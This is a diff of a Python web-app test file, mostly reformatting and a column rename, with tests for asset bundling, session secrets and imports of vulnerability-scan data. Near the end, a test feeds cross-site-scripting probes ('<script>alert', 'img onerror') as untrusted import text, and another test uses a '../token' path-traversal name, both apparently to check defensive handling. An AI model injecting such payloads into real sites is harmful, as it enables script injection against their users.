@@ -159,6 +159,7 @@ def _assert_html_fragments_in_order(body: str, *fragments: str) -> None:
 
 # ── Fixtures ──────────────────────────────────────────────────────────────────
 
+
 def get_client(*, use_forwarded_for=True):
     client = reusable_test_app(__name__).test_client()
     if use_forwarded_for:
@@ -188,6 +189,7 @@ class _CapturedThread:
 
 
 # ── / ─────────────────────────────────────────────────────────────────────────
+
 
 class TestIndexRoute:
     @staticmethod
@@ -239,9 +241,9 @@ class TestIndexRoute:
             '<script defer src="/vendor/ansi_up.js',
             '<script id="lazy-assets-json"',
         )
-        assert '/static/css/styles.css' not in body
-        assert '/static/css/core/base.css?v=' in body
-        assert '/static/css/mobile-chrome.css?v=' in body
+        assert "/static/css/styles.css" not in body
+        assert "/static/css/core/base.css?v=" in body
+        assert "/static/css/mobile-chrome.css?v=" in body
         assert '<script defer src="/vendor/ansi_up.js?v=' in body
         assert '<script src="/static/js/export_pdf.js?v=' not in body
         assert '"export_pdf": {' in body
@@ -319,13 +321,12 @@ class TestIndexRoute:
             "workspace_css": "/static/css/features/workspace.css",
         }
         normalized_assets = {
-            name: self._normalize_lazy_asset_entry(entry)
-            for name, entry in self._lazy_assets_from_body(body).items()
+            name: self._normalize_lazy_asset_entry(entry) for name, entry in self._lazy_assets_from_body(body).items()
         }
         for name, path in expected_modules.items():
             assert normalized_assets[name] == {"url": path, "type": "module"}
             assert f'<script src="{path}' not in body
-            assert f'{path}?v=' not in body
+            assert f"{path}?v=" not in body
         for name, path in expected_styles.items():
             assert normalized_assets[name]["url"].startswith(path + "?v=")
             assert normalized_assets[name]["type"] == "style"
@@ -336,34 +337,25 @@ class TestIndexRoute:
         assert '"xterm_js": "/vendor/xterm.js?v=' in body
         assert '"xterm_fit_js": "/vendor/xterm-addon-fit.js?v=' in body
         assert '"xterm_css": "/vendor/xterm.css?v=' in body
-        assert '/static/js/core/run_output_model.js?v=' not in body
-        assert '/static/js/core/config.js?v=' not in body
+        assert "/static/js/core/run_output_model.js?v=" not in body
+        assert "/static/js/core/config.js?v=" not in body
         assert 'type="module" src="/static/js/shell_bootstrap.entry.js"' in body
-        assert '/static/js/shell_bootstrap.entry.js?v=' not in body
+        assert "/static/js/shell_bootstrap.entry.js?v=" not in body
         assert "__darklabBootstrapAsset" in body
         assert "ESM_BOOTSTRAP_LOAD_FAILED" in body
         assert "window.__darklabBootstrapAsset.start('index', 'shell-bootstrap'," in body
-        assert (
-            "window.__darklabBootstrapAsset.failed('index', 'shell-bootstrap', this.src, event)"
-            in body
-        )
-        assert '/static/js/mobile_chrome.js?v=' not in body
+        assert "window.__darklabBootstrapAsset.failed('index', 'shell-bootstrap', this.src, event)" in body
+        assert "/static/js/mobile_chrome.js?v=" not in body
 
     def test_source_mode_lazy_asset_json_matches_configured_lazy_manifest(self):
         client = get_client()
         body = client.get("/").get_data(as_text=True)
         lazy_assets = self._lazy_assets_from_body(body)
-        configured_lazy = json.loads(
-            (Path(__file__).resolve().parents[2] / "assets.config.json").read_text(encoding="utf-8")
-        )["lazy"]
-        normalized_assets = {
-            name: self._normalize_lazy_asset_entry(entry)
-            for name, entry in lazy_assets.items()
-        }
-        rendered_paths = {
-            name: self._asset_path_without_version(entry["url"])
-            for name, entry in normalized_assets.items()
-        }
+        configured_lazy = json.loads((Path(__file__).resolve().parents[2] / "assets.config.json").read_text(encoding="utf-8"))[
+            "lazy"
+        ]
+        normalized_assets = {name: self._normalize_lazy_asset_entry(entry) for name, entry in lazy_assets.items()}
+        rendered_paths = {name: self._asset_path_without_version(entry["url"]) for name, entry in normalized_assets.items()}
         assert set(rendered_paths.values()) == set(configured_lazy)
         assert len(rendered_paths) == len(configured_lazy)
 
@@ -391,23 +383,14 @@ class TestIndexRoute:
         assert re.search(r'type="module" src="/static/build/shell-bootstrap\.[a-f0-9]{12}\.js"', body)
         assert re.search(r'href="/static/build/static-favicon\.[a-f0-9]{12}\.ico"', body)
         assert "window.__darklabBootstrapAsset.start('index', 'shell-bootstrap'," in body
-        assert (
-            "window.__darklabBootstrapAsset.failed('index', 'shell-bootstrap', this.src, event)"
-            in body
-        )
+        assert "window.__darklabBootstrapAsset.failed('index', 'shell-bootstrap', this.src, event)" in body
         lazy_assets = self._lazy_assets_from_body(body)
-        normalized_assets = {
-            name: self._normalize_lazy_asset_entry(entry)
-            for name, entry in lazy_assets.items()
-        }
-        configured_lazy = json.loads(
-            (Path(__file__).resolve().parents[2] / "assets.config.json").read_text(encoding="utf-8")
-        )["lazy"]
-        assert {
-            entry["url"] for entry in normalized_assets.values()
-        } == {
-            manifest["static_assets"][source]["path"]
-            for source in configured_lazy
+        normalized_assets = {name: self._normalize_lazy_asset_entry(entry) for name, entry in lazy_assets.items()}
+        configured_lazy = json.loads((Path(__file__).resolve().parents[2] / "assets.config.json").read_text(encoding="utf-8"))[
+            "lazy"
+        ]
+        assert {entry["url"] for entry in normalized_assets.values()} == {
+            manifest["static_assets"][source]["path"] for source in configured_lazy
         }
         for name, entry in normalized_assets.items():
             assert entry["url"].startswith("/static/build/"), name
@@ -415,13 +398,13 @@ class TestIndexRoute:
         assert manifest["static_assets"]["/vendor/jspdf.umd.min.js"]["path"] in body
         assert manifest["static_assets"]["/vendor/xterm.css"]["path"] in body
         assert f'<script defer src="{manifest["static_assets"]["/vendor/ansi_up.js"]["path"]}">' in body
-        assert '/static/css/core/base.css?v=' not in body
-        assert '/static/css/mobile-chrome.css?v=' not in body
-        assert '/static/js/core/run_output_model.js?v=' not in body
-        assert '/static/js/core/config.js?v=' not in body
-        assert '/static/js/mobile_chrome.js?v=' not in body
-        assert '/vendor/jspdf.umd.min.js?v=' not in body
-        assert '/vendor/xterm.css?v=' not in body
+        assert "/static/css/core/base.css?v=" not in body
+        assert "/static/css/mobile-chrome.css?v=" not in body
+        assert "/static/js/core/run_output_model.js?v=" not in body
+        assert "/static/js/core/config.js?v=" not in body
+        assert "/static/js/mobile_chrome.js?v=" not in body
+        assert "/vendor/jspdf.umd.min.js?v=" not in body
+        assert "/vendor/xterm.css?v=" not in body
 
     def test_bundle_mode_fails_loud_when_manifest_missing(self, tmp_path, monkeypatch):
         monkeypatch.setattr(shell_app_module, "_ASSET_MANIFEST_PATH", tmp_path / "manifest.json")
@@ -440,35 +423,38 @@ class TestIndexRoute:
 
     def test_esm_asset_bundle_uses_module_type_and_source_entries(self, tmp_path, monkeypatch):
         manifest_path = tmp_path / "manifest.json"
-        manifest_path.write_text(json.dumps({
-            "version": 1,
-            "bundles": {
-                "module-fixture": {
-                    "type": "esm",
-                    "path": "/static/build/module-fixture.123456789abc.js",
-                    "hash": "123456789abc",
-                    "entries": ["/static/js/core/utils.js"],
-                    "sources": [
-                        "/static/js/core/utils.js",
-                        "/static/js/core/output_core.js",
-                    ],
-                    "source_hashes": {},
-                },
-            },
-            "static_assets": {
-                "/vendor/jspdf.umd.min.js": {
-                    "path": "/static/build/vendor-jspdf.123456789abc.js",
-                    "hash": "123456789abc",
-                },
-            },
-        }), encoding="utf-8")
+        manifest_path.write_text(
+            json.dumps(
+                {
+                    "version": 1,
+                    "bundles": {
+                        "module-fixture": {
+                            "type": "esm",
+                            "path": "/static/build/module-fixture.123456789abc.js",
+                            "hash": "123456789abc",
+                            "entries": ["/static/js/core/utils.js"],
+                            "sources": [
+                                "/static/js/core/utils.js",
+                                "/static/js/core/output_core.js",
+                            ],
+                            "source_hashes": {},
+                        },
+                    },
+                    "static_assets": {
+                        "/vendor/jspdf.umd.min.js": {
+                            "path": "/static/build/vendor-jspdf.123456789abc.js",
+                            "hash": "123456789abc",
+                        },
+                    },
+                }
+            ),
+            encoding="utf-8",
+        )
         monkeypatch.setattr(shell_app_module, "_ASSET_MANIFEST_PATH", manifest_path)
 
         with mock.patch.dict("config.CFG", {"asset_bundle_mode": "bundle"}):
             shell_app_module._STATIC_ASSET_URL_CACHE.clear()
-            assert shell_app_module._asset_bundle("module-fixture") == [
-                "/static/build/module-fixture.123456789abc.js"
-            ]
+            assert shell_app_module._asset_bundle("module-fixture") == ["/static/build/module-fixture.123456789abc.js"]
             assert shell_app_module._asset_bundle_script_type("module-fixture") == "module"
             assert shell_app_module._static_asset_url("/vendor/jspdf.umd.min.js") == (
                 "/static/build/vendor-jspdf.123456789abc.js"
@@ -566,7 +552,9 @@ class TestIndexRoute:
         boot_payload = json.loads(match.group(1))
         assert boot_payload == config_payload
 
+
 # ── /health ───────────────────────────────────────────────────────────────────
+
 
 class TestHealthRoute:
     def test_returns_200_when_db_ok(self):
@@ -648,7 +636,7 @@ class TestSecretsRoutes:
     def test_session_secrets_crud_never_returns_value(self, monkeypatch, tmp_path):
         client, patchers = self._secret_client(monkeypatch, tmp_path)
         try:
-            headers = {"X-Session-ID": anonymous_session_id('secrets-route-session')}
+            headers = {"X-Session-ID": anonymous_session_id("secrets-route-session")}
             create = client.post(
                 "/session/secrets",
                 headers=headers,
@@ -704,7 +692,7 @@ class TestSecretsRoutes:
         try:
             resp = client.post(
                 "/session/secrets",
-                headers={"X-Session-ID": anonymous_session_id('secrets-invalid-name-session')},
+                headers={"X-Session-ID": anonymous_session_id("secrets-invalid-name-session")},
                 json={"name": "../token", "value": "secret"},
             )
             assert resp.status_code == 400
@@ -765,7 +753,7 @@ class TestSecretsRoutes:
     def test_session_secrets_reject_duplicate_consumer_env_binding(self, monkeypatch, tmp_path):
         client, patchers = self._secret_client(monkeypatch, tmp_path)
         try:
-            headers = {"X-Session-ID": anonymous_session_id('secrets-consumer-env-session')}
+            headers = {"X-Session-ID": anonymous_session_id("secrets-consumer-env-session")}
             first = client.post(
                 "/session/secrets",
                 headers=headers,
@@ -812,9 +800,7 @@ class TestAtlasImportRoutes:
     def _register_session_token(self, session_id):
         register_durable_session_token(session_id)
 
-    def test_prepared_import_draft_read_is_bounded_owner_scoped_and_expires(
-        self, tmp_path
-    ):
+    def test_prepared_import_draft_read_is_bounded_owner_scoped_and_expires(self, tmp_path):
         client, patchers = self._client(tmp_path)
         try:
             session_id = "tok_atlas_import_draft_owner"
@@ -867,8 +853,7 @@ class TestAtlasImportRoutes:
 
             with db_connect() as conn:
                 conn.execute(
-                    "UPDATE atlas_import_drafts SET normalized_rows_sha256 = 'tampered' "
-                    "WHERE id = ?",
+                    "UPDATE atlas_import_drafts SET normalized_rows_sha256 = 'tampered' WHERE id = ?",
                     (created["draft_id"],),
                 )
                 conn.commit()
@@ -881,9 +866,7 @@ class TestAtlasImportRoutes:
 
             with db_connect() as conn:
                 conn.execute(
-                    "UPDATE atlas_import_drafts "
-                    "SET normalized_rows_sha256 = ?, expires_at = '2000-01-01 00:00:00' "
-                    "WHERE id = ?",
+                    "UPDATE atlas_import_drafts SET normalized_rows_sha256 = ?, expires_at = '2000-01-01 00:00:00' WHERE id = ?",
                     (created["row_set_digest"], created["draft_id"]),
                 )
                 conn.commit()
@@ -910,12 +893,12 @@ class TestAtlasImportRoutes:
             quota_project_id = "proj_atlas_import_quota"
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Imported Scope', 'imported-scope', ?, ?)",
                     (project_id, session_id, datetime.now(timezone.utc).isoformat(), datetime.now(timezone.utc).isoformat()),
                 )
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, status, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, status, created, updated) "
                     "VALUES (?, ?, 'Archived Import Scope', 'archived-import-scope', 'archived', ?, ?)",
                     (
                         archived_project_id,
@@ -925,7 +908,7 @@ class TestAtlasImportRoutes:
                     ),
                 )
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Quota Import Scope', 'quota-import-scope', ?, ?)",
                     (
                         quota_project_id,
@@ -973,9 +956,7 @@ class TestAtlasImportRoutes:
             assert preview_success_extra["entity_new"] == 1
             assert preview_success_extra["finding_new"] == 1
             preview_created_extra = next(
-                call.kwargs["extra"]
-                for call in mock_import_log.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_PREVIEW_CREATED"
+                call.kwargs["extra"] for call in mock_import_log.call_args_list if call.args[0] == "ATLAS_IMPORT_PREVIEW_CREATED"
             )
             assert preview_created_extra["session"].startswith("tok_atla")
             assert preview_created_extra["session"].endswith("********")
@@ -1050,9 +1031,7 @@ class TestAtlasImportRoutes:
                 assert applied_again_stale_digest.get_json()["batch_id"] == applied_payload["batch_id"]
 
             quota_payload = (
-                "row_type,entity_kind,entity_value\n"
-                "entity,domain,quota-one.example\n"
-                "entity,domain,quota-two.example\n"
+                "row_type,entity_kind,entity_value\nentity,domain,quota-one.example\nentity,domain,quota-two.example\n"
             ).encode()
             quota_preview = client.post(
                 "/atlas/imports/preview",
@@ -1067,10 +1046,14 @@ class TestAtlasImportRoutes:
             )
             assert quota_preview.status_code == 200
             quota_preview_payload = quota_preview.get_json()
-            with mock.patch.dict(config.CFG, {
-                "max_project_links_per_project": 20,
-                "max_project_entities_per_project": 1,
-            }, clear=False):
+            with mock.patch.dict(
+                config.CFG,
+                {
+                    "max_project_links_per_project": 20,
+                    "max_project_entities_per_project": 1,
+                },
+                clear=False,
+            ):
                 quota_rejected = client.post(
                     "/atlas/imports/apply",
                     headers={"X-Session-ID": session_id},
@@ -1091,12 +1074,10 @@ class TestAtlasImportRoutes:
                 finding_count = conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"]
                 batch_count = conn.execute("SELECT COUNT(*) AS count FROM atlas_import_batches").fetchone()["count"]
                 batch_status = conn.execute("SELECT status FROM atlas_import_batches").fetchone()["status"]
-                entity_link_count = conn.execute(
-                    "SELECT COUNT(*) AS count FROM atlas_entity_import_links"
-                ).fetchone()["count"]
-                entity_link_occurrence_count = conn.execute(
-                    "SELECT occurrence_count FROM atlas_entity_import_links"
-                ).fetchone()["occurrence_count"]
+                entity_link_count = conn.execute("SELECT COUNT(*) AS count FROM atlas_entity_import_links").fetchone()["count"]
+                entity_link_occurrence_count = conn.execute("SELECT occurrence_count FROM atlas_entity_import_links").fetchone()[
+                    "occurrence_count"
+                ]
                 finding_occurrence_count = conn.execute(
                     "SELECT COUNT(*) AS count FROM atlas_finding_import_occurrences"
                 ).fetchone()["count"]
@@ -1134,9 +1115,7 @@ class TestAtlasImportRoutes:
             assert project_target_count == 1
             assert quota_project_link_count == 0
             apply_success_extra = next(
-                call.kwargs["extra"]
-                for call in mock_apply_log.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_APPLY_SUCCEEDED"
+                call.kwargs["extra"] for call in mock_apply_log.call_args_list if call.args[0] == "ATLAS_IMPORT_APPLY_SUCCEEDED"
             )
             assert apply_success_extra["session"].startswith("tok_atla")
             assert apply_success_extra["session"].endswith("********")
@@ -1149,9 +1128,7 @@ class TestAtlasImportRoutes:
             assert apply_success_extra["entities_created"] == 1
             assert apply_success_extra["project_targets_created"] == 1
             apply_created_extra = next(
-                call.kwargs["extra"]
-                for call in mock_apply_log.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_APPLIED"
+                call.kwargs["extra"] for call in mock_apply_log.call_args_list if call.args[0] == "ATLAS_IMPORT_APPLIED"
             )
             assert apply_created_extra["session"].startswith("tok_atla")
             assert apply_created_extra["session"].endswith("********")
@@ -1161,9 +1138,7 @@ class TestAtlasImportRoutes:
             assert apply_created_extra["option_link_to_project"] is True
             assert apply_created_extra["required_capabilities"] == ["mutate_projects", "triage_findings"]
             replayed_events = [
-                call.kwargs["extra"]
-                for call in mock_apply_log.call_args_list
-                if call.args[0] == "ATLAS_IMPORT_APPLY_REPLAYED"
+                call.kwargs["extra"] for call in mock_apply_log.call_args_list if call.args[0] == "ATLAS_IMPORT_APPLY_REPLAYED"
             ]
             assert len(replayed_events) == 2
             assert replayed_events[0]["draft_status"] == "applied"
@@ -1210,46 +1185,56 @@ class TestAtlasImportRoutes:
             now = datetime.now(timezone.utc).isoformat()
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'CycloneDX Import', 'cyclonedx-import', ?, ?)",
                     (project_id, session_id, now, now),
                 )
                 conn.commit()
-            payload = json.dumps({
-                "bomFormat": "CycloneDX",
-                "specVersion": "1.5",
-                "metadata": {"timestamp": "2026-08-07T12:00:00Z"},
-                "components": [{
-                    "bom-ref": "pkg:pypi/requests@2.31.0",
-                    "type": "library",
-                    "name": "requests",
-                    "version": "2.31.0",
-                    "purl": "pkg:pypi/requests@2.31.0",
-                }, {
-                    "bom-ref": "pkg:pypi/urllib3@2.0.7",
-                    "type": "library",
-                    "name": "urllib3",
-                    "version": "2.0.7",
-                    "purl": "pkg:pypi/urllib3@2.0.7",
-                }],
-                "dependencies": [{
-                    "ref": "pkg:pypi/requests@2.31.0",
-                    "dependsOn": ["pkg:pypi/urllib3@2.0.7"],
-                }],
-                "vulnerabilities": [{
-                    "id": "CVE-2026-4242",
-                    "source": {"name": "Upstream advisory"},
-                    "ratings": [{"severity": "high"}],
-                    "affects": [{"ref": "pkg:pypi/requests@2.31.0"}],
-                }, {
-                    "id": "CVE-2026-4242",
-                    "affects": [{"ref": "pkg:pypi/requests@2.31.0"}],
-                    "analysis": {
-                        "state": "not_affected",
-                        "justification": "code_not_reachable",
-                    },
-                }],
-            }).encode()
+            payload = json.dumps(
+                {
+                    "bomFormat": "CycloneDX",
+                    "specVersion": "1.5",
+                    "metadata": {"timestamp": "2026-08-07T12:00:00Z"},
+                    "components": [
+                        {
+                            "bom-ref": "pkg:pypi/requests@2.31.0",
+                            "type": "library",
+                            "name": "requests",
+                            "version": "2.31.0",
+                            "purl": "pkg:pypi/requests@2.31.0",
+                        },
+                        {
+                            "bom-ref": "pkg:pypi/urllib3@2.0.7",
+                            "type": "library",
+                            "name": "urllib3",
+                            "version": "2.0.7",
+                            "purl": "pkg:pypi/urllib3@2.0.7",
+                        },
+                    ],
+                    "dependencies": [
+                        {
+                            "ref": "pkg:pypi/requests@2.31.0",
+                            "dependsOn": ["pkg:pypi/urllib3@2.0.7"],
+                        }
+                    ],
+                    "vulnerabilities": [
+                        {
+                            "id": "CVE-2026-4242",
+                            "source": {"name": "Upstream advisory"},
+                            "ratings": [{"severity": "high"}],
+                            "affects": [{"ref": "pkg:pypi/requests@2.31.0"}],
+                        },
+                        {
+                            "id": "CVE-2026-4242",
+                            "affects": [{"ref": "pkg:pypi/requests@2.31.0"}],
+                            "analysis": {
+                                "state": "not_affected",
+                                "justification": "code_not_reachable",
+                            },
+                        },
+                    ],
+                }
+            ).encode()
             preview = client.post(
                 "/atlas/imports/preview",
                 data={
@@ -1306,9 +1291,7 @@ class TestAtlasImportRoutes:
                 ).fetchone()
             assert len(rows) == 5
             assert {row["project_id"] for row in rows} == {project_id}
-            assert json.loads(rows[2]["source_detail_json"])["depends_on"] == [
-                "pkg:pypi/urllib3@2.0.7"
-            ]
+            assert json.loads(rows[2]["source_detail_json"])["depends_on"] == ["pkg:pypi/urllib3@2.0.7"]
             not_affected = json.loads(rows[-1]["source_detail_json"])
             assert not_affected["analysis"]["category"] == "not_affected"
             assert dict(finding) == {
@@ -1330,7 +1313,7 @@ class TestAtlasImportRoutes:
             now = datetime.now(timezone.utc).isoformat()
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Nessus Versions', 'nessus-versions', ?, ?)",
                     (project_id, session_id, now, now),
                 )
@@ -1363,9 +1346,7 @@ class TestAtlasImportRoutes:
             assert preview.status_code == 200
             preview_payload = preview.get_json()
             assert preview_payload["counts"]["evidence_valid"] == 1
-            assert preview_payload["samples"]["evidence"][0]["evidence_type"] == (
-                "nessus_service_version"
-            )
+            assert preview_payload["samples"]["evidence"][0]["evidence_type"] == ("nessus_service_version")
             applied = client.post(
                 "/atlas/imports/apply",
                 headers={"X-Session-ID": session_id},
@@ -1391,9 +1372,7 @@ class TestAtlasImportRoutes:
             assert row["format_id"] == "nessus_xml"
             assert row["status"] == "applied"
             source_detail = json.loads(row["source_detail_json"])
-            assert source_detail["cpe"] == (
-                "cpe:2.3:a:example:server:2.5.1:*:*:*:*:*:*:*"
-            )
+            assert source_detail["cpe"] == ("cpe:2.3:a:example:server:2.5.1:*:*:*:*:*:*:*")
             assert source_detail["source_observed_at"] == "2026-08-07T10:30:00-05:00"
             assert source_detail["source_observed_at_timezone"] == "source"
         finally:
@@ -1409,7 +1388,7 @@ class TestAtlasImportRoutes:
             now = datetime.now(timezone.utc).isoformat()
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Greenbone Import', 'greenbone-import', ?, ?)",
                     (project_id, session_id, now, now),
                 )
@@ -1458,9 +1437,7 @@ class TestAtlasImportRoutes:
             preview_payload = preview.get_json()
             assert preview_payload["counts"]["rows"] == 2
             assert preview_payload["counts"]["finding_valid"] == 2
-            assert preview_payload["samples"]["findings"][0]["source_detail"]["nvt_oid"] == (
-                "1.3.6.1.4.1.25623.1.0.12345"
-            )
+            assert preview_payload["samples"]["findings"][0]["source_detail"]["nvt_oid"] == ("1.3.6.1.4.1.25623.1.0.12345")
             applied = client.post(
                 "/atlas/imports/apply",
                 headers={"X-Session-ID": session_id},
@@ -1486,12 +1463,10 @@ class TestAtlasImportRoutes:
             assert counts["project_targets_created"] == 1
             with db_connect() as conn:
                 finding_rows = conn.execute(
-                    "SELECT id, tool_root, origin, validation_method, severity, title, raw_line "
-                    "FROM findings"
+                    "SELECT id, tool_root, origin, validation_method, severity, title, raw_line FROM findings"
                 ).fetchall()
                 occurrences = conn.execute(
-                    "SELECT external_id, source_detail_json FROM atlas_finding_import_occurrences "
-                    "ORDER BY row_number"
+                    "SELECT external_id, source_detail_json FROM atlas_finding_import_occurrences ORDER BY row_number"
                 ).fetchall()
                 project_links = conn.execute(
                     "SELECT entity_type FROM project_links WHERE project_id = ?",
@@ -1506,19 +1481,14 @@ class TestAtlasImportRoutes:
                 "severity": "high",
                 "title": "Updated exported title",
                 "raw_line": (
-                    "Updated result for CVE-2026-12345. "
-                    "CVE references: CVE-2026-12345 Location: 443/tcp "
-                    "QoD: 90% (remote_banner)"
+                    "Updated result for CVE-2026-12345. CVE references: CVE-2026-12345 Location: 443/tcp QoD: 90% (remote_banner)"
                 ),
             }
             assert [row["external_id"] for row in occurrences] == [
                 "1.3.6.1.4.1.25623.1.0.12345",
                 "1.3.6.1.4.1.25623.1.0.12345",
             ]
-            assert {
-                json.loads(row["source_detail_json"])["result_id"]
-                for row in occurrences
-            } == {"result-1", "result-2"}
+            assert {json.loads(row["source_detail_json"])["result_id"] for row in occurrences} == {"result-1", "result-2"}
             assert [row["entity_type"] for row in project_links] == ["atlas_entity"]
         finally:
             for patcher in reversed(patchers):
@@ -1532,15 +1502,12 @@ class TestAtlasImportRoutes:
             project_id = "proj_atlas_import_target_only"
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Target Only Import', 'target-only-import', ?, ?)",
                     (project_id, session_id, datetime.now(timezone.utc).isoformat(), datetime.now(timezone.utc).isoformat()),
                 )
                 conn.commit()
-            csv_payload = (
-                "row_type,entity_kind,entity_value\n"
-                "entity,domain,target-only.example\n"
-            ).encode()
+            csv_payload = ("row_type,entity_kind,entity_value\nentity,domain,target-only.example\n").encode()
             preview = client.post(
                 "/atlas/imports/preview",
                 data={
@@ -1577,9 +1544,7 @@ class TestAtlasImportRoutes:
             assert counts["project_targets_existing"] == 0
             with db_connect() as conn:
                 entity_count = conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"]
-                import_link_count = conn.execute(
-                    "SELECT COUNT(*) AS count FROM atlas_entity_import_links"
-                ).fetchone()["count"]
+                import_link_count = conn.execute("SELECT COUNT(*) AS count FROM atlas_entity_import_links").fetchone()["count"]
                 project_link = conn.execute(
                     "SELECT source FROM project_links WHERE project_id = ?",
                     (project_id,),
@@ -1600,7 +1565,7 @@ class TestAtlasImportRoutes:
             now = datetime.now(timezone.utc).isoformat()
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Port Import', 'port-import', ?, ?)",
                     (project_id, session_id, now, now),
                 )
@@ -1614,12 +1579,15 @@ class TestAtlasImportRoutes:
                 )
                 conn.commit()
             jsonl_payload = (
-                json.dumps({
-                    "row_type": "entity",
-                    "entity_kind": "port",
-                    "entity_value": "imported.example:443/tcp",
-                    "external_id": "port-443",
-                }) + "\n"
+                json.dumps(
+                    {
+                        "row_type": "entity",
+                        "entity_kind": "port",
+                        "entity_value": "imported.example:443/tcp",
+                        "external_id": "port-443",
+                    }
+                )
+                + "\n"
             ).encode()
             preview = client.post(
                 "/atlas/imports/preview",
@@ -1665,7 +1633,7 @@ class TestAtlasImportRoutes:
             assert counts["project_targets_existing"] == 0
             with db_connect() as conn:
                 port_row = conn.execute(
-                    "SELECT id, host_entity_id FROM entities WHERE session_id = ? AND type = 'port'",
+                    "SELECT id, host_entity_id FROM entities WHERE personal_workspace_id = ? AND type = 'port'",
                     (session_id,),
                 ).fetchone()
                 project_link = conn.execute(
@@ -1693,7 +1661,7 @@ class TestAtlasImportRoutes:
             project_id = "proj_atlas_import_target_quota"
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Target Quota Import', 'target-quota-import', ?, ?)",
                     (project_id, session_id, datetime.now(timezone.utc).isoformat(), datetime.now(timezone.utc).isoformat()),
                 )
@@ -1718,11 +1686,15 @@ class TestAtlasImportRoutes:
             preview_payload = preview.get_json()
             assert preview_payload["counts"]["project_target_candidates"] == 2
 
-            with mock.patch.dict(config.CFG, {
-                "max_project_links_per_project": 20,
-                "max_project_entities_per_project": 20,
-                "max_project_targets_per_project": 1,
-            }, clear=False):
+            with mock.patch.dict(
+                config.CFG,
+                {
+                    "max_project_links_per_project": 20,
+                    "max_project_entities_per_project": 20,
+                    "max_project_targets_per_project": 1,
+                },
+                clear=False,
+            ):
                 rejected = client.post(
                     "/atlas/imports/apply",
                     headers={"X-Session-ID": session_id},
@@ -1747,9 +1719,7 @@ class TestAtlasImportRoutes:
                 entity_count = conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"]
                 finding_count = conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"]
                 batch_count = conn.execute("SELECT COUNT(*) AS count FROM atlas_import_batches").fetchone()["count"]
-                entity_link_count = conn.execute(
-                    "SELECT COUNT(*) AS count FROM atlas_entity_import_links"
-                ).fetchone()["count"]
+                entity_link_count = conn.execute("SELECT COUNT(*) AS count FROM atlas_entity_import_links").fetchone()["count"]
                 finding_occurrence_count = conn.execute(
                     "SELECT COUNT(*) AS count FROM atlas_finding_import_occurrences"
                 ).fetchone()["count"]
@@ -1793,13 +1763,13 @@ class TestAtlasImportRoutes:
             )
             with db_connect() as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started, output_preview, output_search_text) "
+                    "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_search_text) "
                     "VALUES (?, ?, 'nmap mixed-existing.example', ?, '[]', 'same evidence')",
                     (run_id, session_id, seen_at),
                 )
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
                     "occurrence_count, created) "
                     "VALUES (?, ?, 'domain', ?, ?, ?, ?, 1, ?)",
                     (entity_id, session_id, canonical_value, subject_key, seen_at, seen_at, seen_at),
@@ -1811,7 +1781,7 @@ class TestAtlasImportRoutes:
                 )
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
+                    "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                     "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, raw_line, created) "
                     "VALUES (?, ?, ?, ?, ?, ?, 'high', 'finding', 'generic', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                     (
@@ -1940,22 +1910,24 @@ class TestAtlasImportRoutes:
             session_id = "tok_atlas_import_untrusted_text"
             self._register_session_token(session_id)
             title = '<script>alert("atlas")</script> TLS finding'
-            evidence = '<img src=x onerror=alert(1)> evidence & notes'
+            evidence = "<img src=x onerror=alert(1)> evidence & notes"
             csv_body = io.StringIO()
             writer = csv.DictWriter(
                 csv_body,
                 fieldnames=["row_type", "entity_kind", "entity_value", "title", "severity", "evidence", "external_id"],
             )
             writer.writeheader()
-            writer.writerow({
-                "row_type": "finding",
-                "entity_kind": "domain",
-                "entity_value": "unsafe-text.example",
-                "title": title,
-                "severity": "medium",
-                "evidence": evidence,
-                "external_id": "unsafe-text-1",
-            })
+            writer.writerow(
+                {
+                    "row_type": "finding",
+                    "entity_kind": "domain",
+                    "entity_value": "unsafe-text.example",
